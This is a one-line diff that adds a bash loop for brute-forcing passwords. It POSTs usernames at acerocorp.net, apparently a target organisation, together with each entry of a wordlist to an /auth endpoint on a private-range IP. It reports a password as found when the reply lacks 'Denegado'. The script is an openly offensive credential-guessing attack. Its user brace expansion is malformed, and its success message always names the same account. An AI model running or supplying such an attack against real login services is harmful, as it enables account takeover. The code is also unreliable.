@@ -1,0 +1,1 @@
+while read line; do res=$(curl -X POST -s -d "u="{elena.martinez@acerocorp.net,dev.ops@acerocorp.net,admin.tech@acerocorp.net}"&p=$line" http://192.168.56.200:8080/auth); if [[ ! $res =~ "Denegado" ]]; then echo "elena.martinez@acerocorp.net --> password found: $line"; fi;  done < diccionario_acerocorp_clean.txt
